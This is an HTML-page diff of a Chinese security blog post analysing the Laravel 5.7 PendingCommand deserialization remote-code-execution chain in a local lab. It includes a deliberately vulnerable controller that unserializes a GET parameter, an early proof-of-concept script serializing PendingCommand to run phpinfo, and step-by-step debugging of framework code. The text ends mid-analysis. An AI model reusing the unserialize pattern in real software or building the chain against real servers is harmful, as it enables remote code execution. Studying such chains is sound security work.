@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="刚审完yii框架的反序列化，又来看看Laravel框架的反序列化 0x01Laravel框架官方文档：https:&#x2F;&#x2F;laravel.com&#x2F;docs&#x2F;12.x&#x2F;releases Laravel 是一个具有高效、优雅语法的 Web 应用框架。它提供了创建应用程序的结构和起点巴拉巴拉一顿夸，这里就越过了 0x02漏洞描述Laravel Framework 5.7.x版本中的Illuminate组件存">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP反序列化-Laravel框架">
+<meta property="og:url" content="https://wanth3f1ag.top/2025/06/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Laravel%E6%A1%86%E6%9E%B6/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="刚审完yii框架的反序列化，又来看看Laravel框架的反序列化 0x01Laravel框架官方文档：https:&#x2F;&#x2F;laravel.com&#x2F;docs&#x2F;12.x&#x2F;releases Laravel 是一个具有高效、优雅语法的 Web 应用框架。它提供了创建应用程序的结构和起点巴拉巴拉一顿夸，这里就越过了 0x02漏洞描述Laravel Framework 5.7.x版本中的Illuminate组件存">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602100639767.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602110840859.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250523174412014.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250523174604474.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250523174938910.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250524135551178.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602111324310.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250524143141421.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602121358570.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602121500847.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602121713484.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602123437713.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602132328410.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602145533130.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602145831041.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602150614975.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602150745666.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602151112375.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602155617880.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602162924419.png">
+<meta property="article:published_time" content="2025-06-02T04:14:32.000Z">
+<meta property="article:modified_time" content="2025-06-12T02:54:45.933Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="Laravel框架">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602100639767.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>PHP反序列化-Laravel框架</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">A6out</a></li><!--
+     --><!--
+       --><li><a href="/tags/">T6gs</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Catagory</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">s4arch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/06/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-TP5%E6%A1%86%E6%9E%B6/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/30/ctfshow%E5%85%A5%E9%97%A8nodejs/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/06/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Laravel%E6%A1%86%E6%9E%B6/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/06/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Laravel%E6%A1%86%E6%9E%B6/&text=PHP反序列化-Laravel框架"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/06/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Laravel%E6%A1%86%E6%9E%B6/&title=PHP反序列化-Laravel框架"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/06/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Laravel%E6%A1%86%E6%9E%B6/&is_video=false&description=PHP反序列化-Laravel框架"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PHP反序列化-Laravel框架&body=Check out this article: https://wanth3f1ag.top/2025/06/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Laravel%E6%A1%86%E6%9E%B6/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/06/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Laravel%E6%A1%86%E6%9E%B6/&title=PHP反序列化-Laravel框架"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/06/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Laravel%E6%A1%86%E6%9E%B6/&title=PHP反序列化-Laravel框架"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/06/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Laravel%E6%A1%86%E6%9E%B6/&title=PHP反序列化-Laravel框架"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/06/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Laravel%E6%A1%86%E6%9E%B6/&title=PHP反序列化-Laravel框架"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/06/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Laravel%E6%A1%86%E6%9E%B6/&name=PHP反序列化-Laravel框架&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/06/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Laravel%E6%A1%86%E6%9E%B6/&t=PHP反序列化-Laravel框架"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01Laravel%E6%A1%86%E6%9E%B6"><span class="toc-number">1.</span> <span class="toc-text">0x01Laravel框架</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.</span> <span class="toc-text">0x02漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">0x03靶场搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">0x04漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05exp%E7%BC%96%E5%86%99"><span class="toc-number">5.</span> <span class="toc-text">0x05exp编写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06exp%E4%BA%8C%E5%BC%80"><span class="toc-number">6.</span> <span class="toc-text">0x06exp二开</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07exp2"><span class="toc-number">7.</span> <span class="toc-text">0x07exp2</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        PHP反序列化-Laravel框架
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wanTh3flag</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-06-02T04:14:32.000Z" class="dt-published" itemprop="datePublished">2025-06-02</time>
+        
+        (Updated: <time datetime="2025-06-12T02:54:45.933Z" class="dt-updated" itemprop="dateModified">2025-06-12</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Laravel%E6%A1%86%E6%9E%B6/" rel="tag">Laravel框架</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>刚审完yii框架的反序列化，又来看看Laravel框架的反序列化</p>
+<h2 id="0x01Laravel框架"><a href="#0x01Laravel框架" class="headerlink" title="0x01Laravel框架"></a>0x01Laravel框架</h2><p>官方文档：<a target="_blank" rel="noopener" href="https://laravel.com/docs/12.x/releases">https://laravel.com/docs/12.x/releases</a></p>
+<p>Laravel 是一个具有高效、优雅语法的 Web 应用框架。它提供了创建应用程序的结构和起点巴拉巴拉一顿夸，这里就越过了</p>
+<h2 id="0x02漏洞描述"><a href="#0x02漏洞描述" class="headerlink" title="0x02漏洞描述"></a>0x02漏洞描述</h2><p>Laravel Framework 5.7.x版本中的Illuminate组件存在反序列化漏洞，远程攻击者可利用该漏洞执行代码</p>
+<p>对PHP版本的要求：php 7.1.3以上</p>
+<h2 id="0x03靶场搭建"><a href="#0x03靶场搭建" class="headerlink" title="0x03靶场搭建"></a>0x03靶场搭建</h2><p>源码地址：<a target="_blank" rel="noopener" href="https://github.com/laravel/laravel/tree/5.7">https://github.com/laravel/laravel/tree/5.7</a></p>
+<p>也可以用composer安装</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project laravel/laravel=5.7.* --prefer-dist Laravel5.7</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602100639767.png" alt="image-20250602100639767"></p>
+<p>然后运行服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan serve</span><br></pre></td></tr></table></figure>
+
+<p>访问8000端口就行</p>
+<p>因为在laravel框架中并没用触发反序列化的点，所以我们需要自己手写一个demo</p>
+<p>在app\http\Controllers下新建控制器TestController.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Http</span>\<span class="title class_">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;poc&#x27;</span>]))&#123;</span><br><span class="line">            <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;poc&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后在routes\web.php添加路由</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Route::get(&#x27;/test&#x27;,&#x27;test_Controller@test&#x27;);//类名@方法名</span><br></pre></td></tr></table></figure>
+
+<p>然后访问test路由</p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602110840859.png" alt="image-20250602110840859"></p>
+<h2 id="0x04漏洞复现"><a href="#0x04漏洞复现" class="headerlink" title="0x04漏洞复现"></a>0x04漏洞复现</h2><p>相比于5.7之前的版本，5.7之后新加入了一个PendingCommand类，我们看看官方对这个类的解释</p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250523174412014.png" alt="image-20250523174412014"></p>
+<p>大致可以看出这个类主要是用来执行命令的，里面有两个受保护的属性string和array分别标表示需要运行的命令和要传递给命令的参数。（在5.7中是$command和$parameters）</p>
+<p>话不多说，我们看看源码</p>
+<p>要触发反序列化漏洞，必然是在<code>__destruct()</code>方法做文章，先看看这个方法</p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250523174604474.png" alt="image-20250523174604474"></p>
+<p>这里调用了run方法，但是需要避开if语句，不过hasExecuted本来便是false</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="variable">$hasExecuted</span> = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>
+
+<p>那我们直接看run方法</p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250523174938910.png" alt="image-20250523174938910"></p>
+<p>这里写着是执行命令的函数，所以这里必然就是我们触发RCE的点了，传个payload然后调试一下看看代码的走向</p>
+<p>exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PendingCommand</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; command = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; parameters[] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>\<span class="title class_">PendingCommand</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingCommand</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>打好断点后开始调试</p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250524135551178.png" alt="image-20250524135551178">反序列化触发__destruct()后进入run()</p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250602111324310.png" alt="image-20250602111324310"></p>
+<p>我们分析一下这段代码</p>
+<p>运行命令的代码在136行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$exitCode</span> = <span class="variable language_">$this</span>-&gt;app[<span class="title class_">Kernel</span>::<span class="variable language_">class</span>]-&gt;<span class="title function_ invoke__">call</span>(<span class="variable">$this</span>-&gt;command, <span class="variable">$this</span>-&gt;parameters);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要进入运行命令的代码，就需要经过133行的代码</p>
+<p>跳断点发现并没有跳到136行代码，所以猜测是问题出现在133行代码的执行上</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">mockConsoleOutput</span>();</span><br></pre></td></tr></table></figure>
+
+<p>这段代码主要是用来模拟终端的输入和输出的，继续前进就进入这个函数</p>
+<p>跟进一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mockConsoleOutput</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$mock</span> = <span class="title class_">Mockery</span>::<span class="title function_ invoke__">mock</span>(<span class="title class_">OutputStyle</span>::<span class="variable language_">class</span>.<span class="string">&#x27;[askQuestion]&#x27;</span>, [</span><br><span class="line">        (<span class="keyword">new</span> <span class="title class_">ArrayInput</span>(<span class="variable">$this</span>-&gt;parameters)), <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">createABufferedOutputMock</span>(),</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;test-&gt;expectedQuestions <span class="keyword">as</span> <span class="variable">$i</span> =&gt; <span class="variable">$question</span>) &#123;</span><br><span class="line">        <span class="variable">$mock</span>-&gt;<span class="title function_ invoke__">shouldReceive</span>(<span class="string">&#x27;askQuestion&#x27;</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">once</span>()</span><br><span class="line">            -&gt;<span class="title function_ invoke__">ordered</span>()</span><br><span class="line">            -&gt;<span class="title function_ invoke__">with</span>(<span class="title class_">Mockery</span>::<span class="title function_ invoke__">on</span>(function (<span class="variable">$argument</span>) <span class="keyword">use</span> (<span class="variable">$question</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$argument</span>-&gt;<span class="title function_ invoke__">getQuestion</span>() == <span class="variable">$question</span>[<span class="number">0</span>];</span><br><span class="line">            &#125;))</span><br><span class="line">            -&gt;<span class="title function_ invoke__">andReturnUsing</span>(function () <span class="keyword">use</span> ($<span class="title">question</span>, $<span class="title">i</span>) &#123;</span><br><span class="line">                <span class="title">unset</span>($<span class="title">this</span>-&gt;<span class="title">test</span>-&gt;<span class="title">expectedQuestions</span>[$<span class="title">i</span>]);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$question</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">bind</span>(<span class="title class_">OutputStyle</span>::<span class="variable language_">class</span>, function () <span class="keyword">use</span> ($<span class="title">mock</span>) &#123;</span><br><span class="line">        <span class="title">return</span> $<span class="title">mock</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的话有Mockery类和ArrayInput类，中间会经过spl_autoload_call-&gt;load-&gt;loadclass，其实就是用来加载类的，不用管，随后会调用createABufferedOutputMock类，我们跟进一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">createABufferedOutputMock</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$mock</span> = <span class="title class_">Mockery</span>::<span class="title function_ invoke__">mock</span>(<span class="title class_">BufferedOutput</span>::<span class="variable language_">class</span>.<span class="string">&#x27;[doWrite]&#x27;</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">shouldAllowMockingProtectedMethods</span>()</span><br><span class="line">            -&gt;<span class="title function_ invoke__">shouldIgnoreMissing</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;test-&gt;expectedOutput <span class="keyword">as</span> <span class="variable">$i</span> =&gt; <span class="variable">$output</span>) &#123;</span><br><span class="line">        <span class="variable">$mock</span>-&gt;<span class="title function_ invoke__">shouldReceive</span>(<span class="string">&#x27;doWrite&#x27;</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">once</span>()</span><br><span class="line">            -&gt;<span class="title function_ invoke__">ordered</span>()</span><br><span class="line">            -&gt;<span class="title function_ invoke__">with</span>(<span class="variable">$output</span>, <span class="title class_">Mockery</span>::<span class="title function_ invoke__">any</span>())</span><br><span class="line">            -&gt;<span class="title function_ invoke__">andReturnUsing</span>(function () <span class="keyword">use</span> ($<span class="title">i</span>) &#123;</span><br><span class="line">                <span class="title">unset</span>($<span class="title">this</span>-&gt;<span class="title">test</span>-&gt;<span class="title">expectedOutput</span>[$<span class="title">i</span>]);</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$mock</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个类是用来模拟和调试控制台输入输出的函数，这里又调用了Mockery对象中的mock函数，步入mock函数后直接走就行，没必要看中间在经过哪些函数和变量</p>
+<p>然后发现代码在执行完$mock的赋值之前就终止了</p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250524143141421.png" alt="image-20250524143141421"></p>
+<p>那就可以看出链子在哪里出了问题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foreach ($this-&gt;test-&gt;expectedOutput as $i =&gt; $output) &#123;</span><br><span class="line">        $mock-&gt;shouldReceive(&#x27;doWrite&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>此时在createABufferedOutputMock()方法中要进入for循环，这里的话会获取test对象中的expectedOutput，然后发现这个属性并没有在实例化对象test中出现，这个属性在<code>trait InteractsWithConsole</code>中，而trait类我们没法实例化，在其他我们可以实例化的类中，也没有一个类存在<code>expectedOutput</code>属性，此外就只有一些测试类有这个属性，所以这里如果需要链子继续下去的话我们需要对expectedOutput进行操作</p>
+<p>所以可以想到，在访问不存在或不可访问的属性的时候会触发<code>__get()</code>方法，并且这里的test是可控的，所以我们全局搜索一下</p>
+<p>在Illuminate\Auth\GenericUser的__get中存在一个<code>__get()</code>方法</p>
